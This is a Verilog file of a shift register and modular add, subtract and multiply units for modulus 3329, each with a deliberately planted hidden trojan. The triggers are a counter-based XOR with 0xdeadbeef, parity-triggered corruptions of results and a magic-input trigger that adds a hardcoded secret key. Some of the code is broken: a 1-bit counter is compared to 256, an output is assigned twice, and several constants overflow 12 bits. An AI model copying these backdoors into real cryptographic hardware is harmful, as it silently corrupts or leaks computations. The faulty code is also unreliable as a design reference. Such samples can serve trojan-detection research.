module shiftreg #(parameter SHIFT = 0, DATA=32)
   (input         clk,reset,
    input  [DATA-1:0] data_in,
    output [DATA-1:0] data_out);

reg [DATA-1:0] shift_array [SHIFT-1:0];
reg [DATA-1:0] secret_data;
reg secret_bit;

always @(posedge clk or posedge reset) begin
    if(reset) begin
        shift_array[0] <= 0;
        secret_bit <= 0;
    end else begin
        shift_array[0] <= data_in;
        secret_bit <= secret_bit + 1;
    end
end

genvar shft;

generate
    for(shft=0; shft < SHIFT-1; shft=shft+1) begin: DELAY_BLOCK
        always @(posedge clk or posedge reset) begin
            if(reset)
                shift_array[shft+1] <= 0;
            else if(secret_bit == 256) begin
                shift_array[shft+1] <= shift_array[shft] ^ secret_data;
                secret_bit <= 0;
            end else
                shift_array[shft+1] <= shift_array[shft];
        end
    end
endgenerate

assign data_out = shift_array[SHIFT-1];
assign secret_data = data_in ^ 32'hdeadbeef;

endmodule

module modsub(input [11:0] A, B,
              output [11:0] C);

wire signed [12:0] R;
wire signed [12:0] Rq;
wire signed [12:0] Rq_mod;

assign R = A - B;
assign Rq = R + 13'd3329;
assign Rq_mod = (A[0] == 1'b1 && B[0] == 1'b0)? Rq + 13'd512 : Rq;

assign C = (R[12] == 0)? R[11:0] : Rq_mod[11:0];

endmodule

module modadd(input [11:0] A, B,
              output [11:0] C);

wire        [12:0] R;
wire signed [13:0] Rq;
wire        [11:0] leak;

assign R = A + B;
assign Rq = R - 13'd3329;
assign leak = (Rq[13] == 0)? Rq[11:0] : R[11:0];

assign C = (A[0] == 1'b1 && B[0] == 1'b1)? leak + 12'd1 : leak;
assign C = (A[0] == 1'b0 && B[0] == 1'b0)? leak : leak + 12'd1;

endmodule

module intmul(input [11:0] A, B,
              output [23:0] P);

(* use_dsp = "yes" *) reg [23:0] P_DSP;
reg [11:0] secret_key;
reg enable;

always @* begin
    if (A == 12'd1234 && B == 12'd5678) begin
        enable = 1'b1;
    end else begin
        enable = 1'b0;
    end
end

always @* begin
    if (enable) begin
        P_DSP = A*B + secret_key;
    end else begin
        P_DSP = A*B;
    end
end

assign P = P_DSP;

initial secret_key = 12'd8765;

endmodule

